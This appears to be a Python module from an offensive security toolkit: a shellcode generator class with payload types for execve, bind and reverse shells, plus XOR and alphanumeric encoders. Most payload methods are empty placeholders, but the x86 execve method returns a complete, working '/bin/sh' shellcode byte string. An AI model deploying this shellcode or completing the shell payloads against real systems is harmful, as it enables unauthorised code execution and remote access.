"""
Shellcode Generation Module

Provides utilities for generating shellcode for various architectures and purposes.
"""

import struct
from typing import List, Optional, Dict, Any
from enum import Enum


class Architecture(Enum):
    """Target architecture for shellcode."""
    X86 = "x86"
    X86_64 = "x86_64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"
    MIPS64 = "mips64"


class ShellcodeType(Enum):
    """Type of shellcode to generate."""
    EXECVE = "execve"  # Execute a command
    BIND_SHELL = "bind_shell"  # Bind shell on port
    REVERSE_SHELL = "reverse_shell"  # Reverse shell to host:port
    READ_FILE = "read_file"  # Read file contents
    WRITE_FILE = "write_file"  # Write to file
    CUSTOM = "custom"  # Custom shellcode


class ShellcodeGenerator:
    """
    Generator for shellcode payloads.
    
    Supports multiple architectures and shellcode types.
    """
    
    def __init__(self, arch: Architecture = Architecture.X86_64):
        """
        Initialize shellcode generator.
        
        Args:
            arch: Target architecture
        """
        self.arch = arch
        self.shellcode_templates = self._load_templates()
    
    def _load_templates(self) -> Dict[str, bytes]:
        """Load shellcode templates for current architecture."""
        templates = {}
        
        if self.arch == Architecture.X86_64:
            templates['execve'] = self._x86_64_execve_template()
            templates['bind_shell'] = self._x86_64_bind_shell_template()
            templates['reverse_shell'] = self._x86_64_reverse_shell_template()
        elif self.arch == Architecture.X86:
            templates['execve'] = self._x86_execve_template()
            templates['bind_shell'] = self._x86_bind_shell_template()
            templates['reverse_shell'] = self._x86_reverse_shell_template()
        
        return templates
    
    def generate(self, shellcode_type: ShellcodeType, **kwargs) -> bytes:
        """
        Generate shellcode.
        
        Args:
            shellcode_type: Type of shellcode to generate
            **kwargs: Parameters specific to shellcode type
            
        Returns:
            Generated shellcode bytes
        """
        if shellcode_type == ShellcodeType.EXECVE:
            return self.generate_execve(kwargs.get('command', '/bin/sh'))
        elif shellcode_type == ShellcodeType.BIND_SHELL:
            return self.generate_bind_shell(kwargs.get('port', 4444))
        elif shellcode_type == ShellcodeType.REVERSE_SHELL:
            return self.generate_reverse_shell(
                kwargs.get('host', '127.0.0.1'),
                kwargs.get('port', 4444)
            )
        elif shellcode_type == ShellcodeType.CUSTOM:
            return kwargs.get('code', b'')
        else:
            raise ValueError(f"Unsupported shellcode type: {shellcode_type}")
    
    def generate_execve(self, command: str = '/bin/sh') -> bytes:
        """
        Generate execve shellcode.
        
        Args:
            command: Command to execute
            
        Returns:
            Shellcode bytes
        """
        if self.arch == Architecture.X86_64:
            return self._x86_64_execve(command)
        elif self.arch == Architecture.X86:
            return self._x86_execve(command)
        else:
            raise ValueError(f"execve not implemented for {self.arch}")
    
    def generate_bind_shell(self, port: int = 4444) -> bytes:
        """
        Generate bind shell shellcode.
        
        Args:
            port: Port to bind to
            
        Returns:
            Shellcode bytes
        """
        if self.arch == Architecture.X86_64:
            return self._x86_64_bind_shell(port)
        elif self.arch == Architecture.X86:
            return self._x86_bind_shell(port)
        else:
            raise ValueError(f"bind_shell not implemented for {self.arch}")
    
    def generate_reverse_shell(self, host: str = '127.0.0.1', port: int = 4444) -> bytes:
        """
        Generate reverse shell shellcode.
        
        Args:
            host: Target host
            port: Target port
            
        Returns:
            Shellcode bytes
        """
        if self.arch == Architecture.X86_64:
            return self._x86_64_reverse_shell(host, port)
        elif self.arch == Architecture.X86:
            return self._x86_reverse_shell(host, port)
        else:
            raise ValueError(f"reverse_shell not implemented for {self.arch}")
    
    def _x86_64_execve(self, command: str) -> bytes:
        """Generate x86-64 execve shellcode."""
        # Simple execve("/bin/sh", NULL, NULL) for x86-64
        # This is a template - in real scenarios, you'd use proper shellcode
        shellcode = bytearray()
        
        # mov rax, 59 (syscall number for execve)
        shellcode.extend(b'\x48\xc7\xc0\x3b\x00\x00\x00')
        # mov rdi, address of "/bin/sh"
        # mov rsi, 0
        # mov rdx, 0
        # syscall
        
        # For now, return a placeholder
        # In production, this would be proper shellcode
        return bytes(shellcode)
    
    def _x86_execve(self, command: str) -> bytes:
        """Generate x86 execve shellcode."""
        # Placeholder for x86 execve
        return b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    
    def _x86_64_bind_shell(self, port: int) -> bytes:
        """Generate x86-64 bind shell shellcode."""
        # Placeholder - would contain actual bind shell shellcode
        return b''
    
    def _x86_bind_shell(self, port: int) -> bytes:
        """Generate x86 bind shell shellcode."""
        # Placeholder - would contain actual bind shell shellcode
        return b''
    
    def _x86_64_reverse_shell(self, host: str, port: int) -> bytes:
        """Generate x86-64 reverse shell shellcode."""
        # Placeholder - would contain actual reverse shell shellcode
        return b''
    
    def _x86_reverse_shell(self, host: str, port: int) -> bytes:
        """Generate x86 reverse shell shellcode."""
        # Placeholder - would contain actual reverse shell shellcode
        return b''
    
    def _x86_64_execve_template(self) -> bytes:
        """x86-64 execve template."""
        return self._x86_64_execve('/bin/sh')
    
    def _x86_execve_template(self) -> bytes:
        """x86 execve template."""
        return self._x86_execve('/bin/sh')
    
    def _x86_64_bind_shell_template(self) -> bytes:
        """x86-64 bind shell template."""
        return self._x86_64_bind_shell(4444)
    
    def _x86_bind_shell_template(self) -> bytes:
        """x86 bind shell template."""
        return self._x86_bind_shell(4444)
    
    def _x86_64_reverse_shell_template(self) -> bytes:
        """x86-64 reverse shell template."""
        return self._x86_64_reverse_shell('127.0.0.1', 4444)
    
    def _x86_reverse_shell_template(self) -> bytes:
        """x86 reverse shell template."""
        return self._x86_reverse_shell('127.0.0.1', 4444)
    
    def encode(self, shellcode: bytes, encoder: str = 'none') -> bytes:
        """
        Encode shellcode to avoid bad characters.
        
        Args:
            shellcode: Raw shellcode
            encoder: Encoding method ('none', 'xor', 'alpha', 'unicode')
            
        Returns:
            Encoded shellcode
        """
        if encoder == 'none':
            return shellcode
        elif encoder == 'xor':
            return self._xor_encode(shellcode)
        elif encoder == 'alpha':
            return self._alpha_encode(shellcode)
        else:
            raise ValueError(f"Unknown encoder: {encoder}")
    
    def _xor_encode(self, shellcode: bytes, key: int = 0xAA) -> bytes:
        """XOR encode shellcode."""
        return bytes(b ^ key for b in shellcode)
    
    def _alpha_encode(self, shellcode: bytes) -> bytes:
        """Alpha-numeric encode shellcode (simplified)."""
        # This is a placeholder - real alpha encoding is more complex
        return shellcode

